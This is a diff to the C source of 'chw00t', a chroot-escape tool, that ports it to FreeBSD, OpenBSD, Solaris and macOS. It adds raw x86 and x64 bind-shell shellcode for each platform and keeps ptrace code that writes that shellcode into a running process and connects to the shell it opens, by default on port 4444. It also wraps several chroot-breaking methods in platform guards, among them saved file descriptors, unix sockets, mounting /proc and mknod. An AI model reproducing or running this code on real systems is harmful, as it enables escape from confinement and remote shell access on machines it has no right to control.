@@ -28,20 +28,92 @@
 #include <dirent.h>
 #include <getopt.h>
 #include <fcntl.h>
+#include <netdb.h>
+
+//FreeBSD
+#ifndef PTRACE_ATTACH
+#define PTRACE_ATTACH PT_ATTACH
+#define PTRACE_DETACH PT_DETACH
+#define PTRACE_GETREGS PT_GETREGS
+#define PTRACE_POKEDATA PT_WRITE_D
+#endif
+#if __FreeBSD__ || __OpenBSD__
+#define X86_SHELLCODE_LEN 73
+#define X86_SHELLCODE_PORT1 6
+#define X86_SHELLCODE_PORT2 7
+#define X86_SHELLCODE \
+	"\x31\xc0\x50\x68\xff\x02\x11\x5c\x89\xe7\x50\x6a\x01\x6a\x02" \
+	"\x6a\x10\xb0\x61\xcd\x80\x57\x50\x50\x6a\x68\x58\xcd\x80\x89" \
+	"\x47\xec\xb0\x6a\xcd\x80\xb0\x1e\xcd\x80\x50\x50\x6a\x5a\x58" \
+	"\xcd\x80\xff\x4f\xe4\x79\xf6\x50\x68\x2f\x2f\x73\x68\x68\x2f" \
+	"\x62\x69\x6e\x89\xe3\x50\x54\x53\x50\xb0\x3b\xcd\x80"
+
+#if __x86_64__
+#define X64_SHELLCODE_LEN 93
+#define X64_SHELLCODE_PORT1 19
+#define X64_SHELLCODE_PORT2 20
+#define X64_SHELLCODE \
+	"\x6a\x61\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x52" \
+	"\x48\xba\x00\x02\x11\x5c\x00\x00\x00\x00\x52\x48\x89\xe6\x6a" \
+	"\x10\x5a\x04\x66\x0f\x05\x48\x31\xf6\x6a\x6a\x58\x0f\x05\x99" \
+	"\x04\x1e\x0f\x05\x48\x89\xc7\x6a\x5a\x58\x0f\x05\xff\xc6\x04" \
+	"\x5a\x0f\x05\xff\xc6\x04\x59\x0f\x05\x52\x48\xbf\x2f\x2f\x62" \
+	"\x69\x6e\x2f\x73\x68\x57\x48\x89\xe7\x52\x57\x48\x89\xe6\x04" \
+	"\x39\x0f\x05"
+#endif
+#endif
+
+//\FreeBSD
+
+#if __linux__
+#define X86_SHELLCODE_LEN 78
+#define X86_SHELLCODE_PORT1 21
+#define X86_SHELLCODE_PORT2 22
+#define X86_SHELLCODE \
+	"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80" \
+        "\x5b\x5e\x52\x68\x02\x00\x11\x5c\x6a\x10\x51\x50\x89\xe1\x6a" \
+        "\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0" \
+        "\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f" \
+        "\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0" \
+        "\x0b\xcd\x80"
+
+#if __x86_64__
+#define X64_SHELLCODE_LEN 86
+#define X64_SHELLCODE_PORT1 20
+#define X64_SHELLCODE_PORT2 21
+#define X64_SHELLCODE \
+	"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x52" \
+        "\xc7\x04\x24\x02\x00\x11\x5c\x48\x89\xe6\x6a\x10\x5a\x6a\x31" \
+        "\x58\x0f\x05\x6a\x32\x58\x0f\x05\x48\x31\xf6\x6a\x2b\x58\x0f" \
+        "\x05\x48\x97\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75" \
+        "\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00" \
+        "\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"
+#endif
+#endif
 
 #define MAX_DEPTH	255
-#define OPEN_MAX	255
+#define BUFLEN		255*16
 #define SHELLNUM	11
 #define FSNUM		6
+
 #define UNIX_PATH_MAX   108
+#if __linux__
 #define SOCKETNAME	"#anonsocket"
+#else
+#define SOCKETNAME	"/anonsocket"
+#endif
+
+#ifndef OPEN_MAX
+#define OPEN_MAX	255
+#endif
+#ifndef PID_MAX
 #define PID_MAX		65535 // 2^16-1
-#define BUFLEN		255*16
+#endif
 
 // symlinks on shells could result in segfault on solaris
 char *shells[] = {"/bin/bash", "/bin/sh", "/bin/dash", "/bin/ksh",
         "/bin/csh", "/usr/bin/sh", "/usr/bin/bash", 
-        "/usr/bin/ksh", "/usr/bin/csh", "/usr/bin/dash",
+        "/bin/ksh", "/usr/bin/csh", "/usr/bin/dash",
         "/usr/bin/zsh" };
 
 // based on the examples form http://www.thomasstover.com/uds.html
@@ -141,42 +213,58 @@ void putdata(pid_t child, long addr,
     int i, j;
     union u {
             long val;
-            char chars[4];
-    }data;
+            char chars[sizeof(int)];
+    } data;
+
     i = 0;
-    j = len / 4;
+    j = len / sizeof(int);
     laddr = str;
     while(i < j) {
-        memcpy(data.chars, laddr, 4);
+        memcpy(data.chars, laddr, sizeof(int));
         ptrace(PTRACE_POKEDATA, child,
-               addr + i * 4, data.val);
+               (void*)addr + i * sizeof(int), data.val);
         ++i;
-        laddr += 4;
+        laddr += sizeof(int);
     }
-    j = len % 4;
+    j = len % sizeof(int);
     if(j != 0) {
         memcpy(data.chars, laddr, j);
         ptrace(PTRACE_POKEDATA, child,
-               addr + i * 4, data.val);
+               (void*)addr + i * sizeof(int), data.val);
     }
 }
 
 void usage(char *tool)
 {
     
+#if !__NetBSD__
     printf("Usage of chw00t - Unices chroot breaking tool:\n\n"
 	"[*] Methods:\n"
+#if !__FreeBSD__ && !__OpenBSD__
 	"    -0\tClassic\n"
-	"    -1\tClassic with saved file descriptor\n"
-	"    -2\tUnix domain socket\n"
-	"    -3\tMount /proc\n"
-	"    -4\tMake block device (mknod) /proc\n"
-	"    -5\tMove out of chroot (nested)\n"
-	"    -6\tPtrace x32 for 32bit processes (Linux only)\n"
-#if __x86_64__
-	"    -7\tPtrace x64 for 64bit processes (Linux only)\n"
 #endif
+#if !__FreeBSD__ && !__OpenBSD__ && !__DragonflyBSD__
+	"    -1\tClassic with saved file descriptor\n"
+#endif
+	"    -2\tUnix domain socket\n"
+#if !__FreeBSD__ && !__OpenBSD__ && !__DragonflyBSD__ && \
+	!__APPLE__
+	"    -3\tMount /proc\n"
+#endif
+#if !__FreeBSD__ && !__OpenBSD__ && !__DragonflyBSD__ && \
+	!__APPLE__ && !__sun
+	"    -4\tMake block device (mknod)\n"
+#endif
+	"    -5\tMove out of chroot (nested)\n"
+#if !__APPLE__ && !__sun
+	"    -6\tPtrace x32 for 32bit processes\n"
+#if __x86_64__
+	"    -7\tPtrace x64 for 64bit processes\n"
+#endif
+#endif
+#if !__FreeBSD__ && !__OpenBSD__ && !__DragonflyBSD__
 	"    -9\tOpen filedescriptor (demo purposes)\n"
+#endif
 	"\n"
 	"[*] Paramaters:\n"
 	"    --pid PID\t\tPID to ptrace\n"
@@ -186,6 +274,9 @@ void usage(char *tool)
 	"    --tempdir NAME\tNew temporary directory name\n\n"
 	"[*] Miscellaneous:\n"
 	"    --help/-h\tThis help\n\n");
+#else
+    printf("NetBSD is not supported at the moment\n");
+#endif
 }
 
 int movetotheroot()
@@ -200,7 +291,7 @@ int movetotheroot()
 
     return 0;
 }
-
+#if !__FreeBSD__ && !__OpenBSD__
 int classic(char *dir) {
     int err, i;
     struct stat dirstat;
@@ -245,13 +336,15 @@ int classic(char *dir) {
     {
 	if ((err = stat(shells[i], &dirstat)) == 0)
 	{
-	    return execl(shells[i], NULL, NULL);
+	    return execve(shells[i], NULL, NULL);
 	}
     }
 
     return 0;
 }
+#endif
 
+#if !__FreeBSD__ && !__OpenBSD__ && !__DragonflyBSD__
 int classicfd(char *dir) {
     int err, i, fd;
     struct stat dirstat;
@@ -316,12 +409,13 @@ int classicfd(char *dir) {
     {
 	if ((err = stat(shells[i], &dirstat)) == 0)
 	{
-	    return execl(shells[i], NULL, NULL);
+	    return execve(shells[i], NULL, NULL);
 	}
     }
 
     return 0;
 }
+#endif
 
 int uds(char *dir) 
 {
@@ -380,7 +474,9 @@ int uds(char *dir)
         snprintf(addr.sun_path, UNIX_PATH_MAX, "%s", SOCKETNAME);
 	// seting abstract named socket here, to be accessible from chroot
 	// could be standard uds as well, just putting it under the new chroot
+#if !__FreeBSD__ && !__OpenBSD__
 	addr.sun_path[0] = 0;
+#endif
 
 	printf("[+] P: connecting socket\n");
 	if (connect(socket_fd, (struct sockaddr *)&addr, 
@@ -432,7 +528,7 @@ int uds(char *dir)
 	{
 	    if ((err = stat(shells[i], &dirstat)) == 0)
 	    {
-		return execl(shells[i], NULL, NULL);
+		return execve(shells[i], NULL, NULL);
 	    }
 	}
 
@@ -455,8 +551,10 @@ int uds(char *dir)
 	}
 	memset(&addr, 0, sizeof(struct sockaddr_un));
 	addr.sun_family = AF_UNIX;
-	snprintf(addr.sun_path, UNIX_PATH_MAX, "%s", SOCKETNAME);
+	snprintf(addr.sun_path, UNIX_PATH_MAX, "%s/%s", dir, SOCKETNAME);
+#if !__FreeBSD__ && !__OpenBSD__
 	addr.sun_path[0] = 0;
+#endif
 
 	printf("[+] C: binding socket\n");
 	if(bind(socket_fd, (struct sockaddr *)&addr, 
@@ -499,6 +597,8 @@ int uds(char *dir)
 
 }
 
+#if !__FreeBSD__ && !__OpenBSD__ && !__DragonflyBSD__ && \
+        !__APPLE__
 int mountproc(char *dir) 
 {
     int err, i, fd;
@@ -589,13 +689,16 @@ int mountproc(char *dir)
     {
 	if ((err = stat(shells[i], &ownstat)) == 0)
 	{
-	    return execl(shells[i], NULL, NULL);
+	    return execve(shells[i], NULL, NULL);
 	}
     }
 
     return 0;
 }
+#endif
 
+#if !__FreeBSD__ && !__OpenBSD__ && !__DragonflyBSD__ && \
+        !__APPLE__ && !__sun
 int makeblockdevice(char *devdir, char *mountdir)
 {
     int err, i, j, h, fd;
@@ -661,7 +764,7 @@ int makeblockdevice(char *devdir, char *mountdir)
                         if (!chdir(mountdir) && !chroot("."))
                         {
 			    free(shellname);
-			    return execl(shells[h], NULL, NULL);
+			    return execve(shells[h], NULL, NULL);
 			}
                     }
 		}
@@ -696,7 +799,7 @@ int makeblockdevice(char *devdir, char *mountdir)
 			if (!chdir(mountdir) && !chroot("."))
                         {
 			    free(shellname);
-			    return execl(shells[h], NULL, NULL);
+			    return execve(shells[h], NULL, NULL);
 			}
 		    }
 		}
@@ -709,11 +812,17 @@ int makeblockdevice(char *devdir, char *mountdir)
     return 0;
 
 }
+#endif
 
+#if !__APPLE__ && !__sun
 int ptracepid(unsigned long long pid, int x64, unsigned int port) 
 {
     pid_t traced_process;
-    struct user_regs_struct regs, newregs;
+#if __linux__
+    struct user_regs_struct regs;
+#else
+    struct reg regs;
+#endif
     int socketfd, nready;
     struct sockaddr_in serv_addr;
     struct timeval ts;
@@ -721,33 +830,24 @@ int ptracepid(unsigned long long pid, int x64, unsigned int port)
     unsigned char buf[BUFLEN+1]; 
     int rv, one = 1;
     
-    int len_x86 = 78;
-    char shellcode_x86[] =
-    	"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80"
-    	"\x5b\x5e\x52\x68\x02\x00\x11\x5c\x6a\x10\x51\x50\x89\xe1\x6a"
-    	"\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0"
-    	"\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f"
-    	"\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0"
-    	"\x0b\xcd\x80";
-    
-    int len_x64 = 86;
-    char shellcode_x64[] = 
-	"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x52"
-	"\xc7\x04\x24\x02\x00\x11\x5c\x48\x89\xe6\x6a\x10\x5a\x6a\x31"
-	"\x58\x0f\x05\x6a\x32\x58\x0f\x05\x48\x31\xf6\x6a\x2b\x58\x0f"
-	"\x05\x48\x97\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
-	"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00"
-	"\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05";
+    int len_x86 = X86_SHELLCODE_LEN;
+    char shellcode_x86[] = X86_SHELLCODE;
+#if __x86_64__
+    int len_x64 = X64_SHELLCODE_LEN;
+    char shellcode_x64[] = X64_SHELLCODE;
+#endif
 
     if (port)
     {
 #if __x86_64__
-	shellcode_x64[20] = (port >> 8) & 0xFF;
-	shellcode_x64[21] = port & 0xFF;
-#else
-	shellcode_x86[21] = (port >> 8) & 0xFF;
-	shellcode_x86[22] = port & 0xFF;
+	if (x64)
+	{
+	    shellcode_x64[X64_SHELLCODE_PORT1] = (port >> 8) & 0xFF;
+	    shellcode_x64[X64_SHELLCODE_PORT2] = port & 0xFF;
+	}
 #endif
+	shellcode_x86[X86_SHELLCODE_PORT1] = (port >> 8) & 0xFF;
+	shellcode_x86[X86_SHELLCODE_PORT2] = port & 0xFF;
     }
     else port = 4444;
 
@@ -762,7 +862,7 @@ int ptracepid(unsigned long long pid, int x64, unsigned int port)
 		printf("[+] Found pid: %llu\n", pid);
    		printf("[+] PTRACE: attach process: %llu\n", pid);
     		traced_process = pid;
-    		if (ptrace(PTRACE_ATTACH, traced_process, NULL, NULL))
+    		if (ptrace(PTRACE_ATTACH, traced_process, 0, 0))
     		{
 		    printf("[-] error attaching process\n");
 		    continue;
@@ -775,14 +875,18 @@ int ptracepid(unsigned long long pid, int x64, unsigned int port)
     {
 	printf("[+] PTRACE: attach process: %llu\n", pid);
 	traced_process = pid;
-	if (ptrace(PTRACE_ATTACH, traced_process, NULL, NULL))
+	if (ptrace(PTRACE_ATTACH, traced_process, 0, 0))
 	{
 	    printf("[-] error attaching process\n");
 	    return 0xDEADBEEF;
 	}
     }
     wait(NULL);
+#if __linux__
     if (ptrace(PTRACE_GETREGS, traced_process, NULL, &regs))
+#else
+    if (ptrace(PTRACE_GETREGS, traced_process, (void*)&regs, 0))
+#endif
     {
         printf("[-] error getting registers\n");
         return 0xDEADBEEF;
@@ -792,20 +896,32 @@ int ptracepid(unsigned long long pid, int x64, unsigned int port)
 #if __x86_64__
     if (x64) 
     {
+#if __linux__
 	putdata(traced_process, regs.rip,
+#else
+	putdata(traced_process, regs.r_rip,
+#endif
 	    shellcode_x64, len_x64);
     }
     else 
     {
+#if __linux__
 	putdata(traced_process, regs.rip,
+#else
+	putdata(traced_process, regs.r_rip,
+#endif
             shellcode_x86, len_x86);
     }
 #else
+#if __linux__
     putdata(traced_process, regs.eip,
+#else
+    putdata(traced_process, regs.r_eip,
+#endif
         shellcode_x86, len_x86);
 #endif
     printf("[+] PTRACE: detach and sleep\n");
-    if (ptrace(PTRACE_DETACH, traced_process, NULL, NULL))
+    if (ptrace(PTRACE_DETACH, traced_process, 0, 0))
     {
         printf("[-] error detaching process\n");
         return 0xDEADBEEF;
@@ -819,7 +935,12 @@ int ptracepid(unsigned long long pid, int x64, unsigned int port)
 	return 0xDEADBEEF;
     }
 
+#if __linux__
+    // cannot be statically linked because of glibc reasons...
     setsockopt(socketfd, SOL_TCP, TCP_NODELAY, &one, sizeof(one));
+#else
+    setsockopt(socketfd, 6, TCP_NODELAY, &one, sizeof(one));
+#endif
     memset(&serv_addr, 0, sizeof(serv_addr));
     serv_addr.sin_family = AF_INET;
     serv_addr.sin_port = htons(port);
@@ -875,6 +996,7 @@ int ptracepid(unsigned long long pid, int x64, unsigned int port)
 
     return 0;
 }
+#endif
 
 int moveooc(char *chrootdir, char *nesteddir, char *newdir) 
 {
@@ -966,7 +1088,7 @@ int moveooc(char *chrootdir, char *nesteddir, char *newdir)
 	{
 	    if ((err = stat(shells[i], &dirstat)) == 0)
 	    {
-		return execl(shells[i], NULL, NULL);
+		return execve(shells[i], NULL, NULL);
 	    }
 	}
     }
@@ -990,6 +1112,7 @@ int moveooc(char *chrootdir, char *nesteddir, char *newdir)
     descriptors, the process can break out the chroot. This should be 
     implemented as a shellcode.
 */
+#if !__FreeBSD__ && !__OpenBSD__ && !__DragonflyBSD__
 int fddemo(char *dir)
 {
     DIR *dird, *dird2;
@@ -1058,7 +1181,7 @@ int fddemo(char *dir)
 		{
 		    if ((err = stat(shells[i], &fdstat)) == 0)
 		    {
-			return execl(shells[i], NULL, NULL);
+			return execve(shells[i], NULL, NULL);
 		    }
 		}
 	    }
@@ -1068,9 +1191,11 @@ int fddemo(char *dir)
     return 0;
 
 }
+#endif
 
 int main(int argc, char **argv)
 {
+#if !__NetBSD__
     int o, option_index = 0, method = -1;
     unsigned long long pid_arg = 0;
     unsigned int port_arg = 0;
@@ -1180,56 +1305,76 @@ int main(int argc, char **argv)
     }
     switch(method)
     {
+#if !__FreeBSD__ && !__OpenBSD__
         case 0:
             if (dir1_arg)
                 return classic(dir1_arg);
             else
                 printf("[-] Missing argument: --dir\n\n");
             break;
+#endif
+#if !__FreeBSD__ && !__OpenBSD__ && !__DragonflyBSD__
         case 1:
             if (dir1_arg)
 		return classicfd(dir1_arg);
             else
                 printf("[-] Missing argument: --dir\n\n");
             break;
+#endif
         case 2:
             if (dir1_arg)
 		return uds(dir1_arg);
             else
                 printf("[-] Missing argument: --dir\n\n");
             break;
+#if !__FreeBSD__ && !__OpenBSD__ && !__DragonflyBSD__ && \
+        !__APPLE__
         case 3:
             if (dir1_arg)
 		return mountproc(dir1_arg);
             else
                 printf("[-] Missing argument: --dir\n\n");
             break;
+#endif
+#if !__FreeBSD__ && !__OpenBSD__ && !__DragonflyBSD__ && \
+        !__APPLE__ && !__sun
         case 4:
             if (dir1_arg && dir3_arg)
 		return makeblockdevice(dir1_arg, dir3_arg);
             else
                 printf("[-] Missing argument: --dir or --tempdir\n\n");
             break;
+#endif
         case 5:
             if (dir1_arg && dir2_arg && dir3_arg)
 		return moveooc(dir1_arg, dir2_arg, dir3_arg);
             else
                 printf("[-] Missing argument: --dir or --nestdir or --tempdir\n\n");
             break;
+#if !__APPLE__ && !__sun
         case 6:
             return ptracepid(pid_arg, 0, port_arg);
             break;
+#if __x86_64__
         case 7:
             return ptracepid(pid_arg, 1, port_arg);
             break; 
+#endif
+#endif
+#if !__FreeBSD__ && !__OpenBSD__ && !__DragonflyBSD__
         case 9:
             if (dir1_arg)
 		return fddemo(dir1_arg);
             else
                 printf("[-] Missing argument: --dir\n\n");
             break;
+#endif
 	default:
 	    printf("[-] No method was chosen\n");
 	    break;
-    } 
+    }
+#else
+    usage(argv[0]);
+    return 0;
+#endif
 }
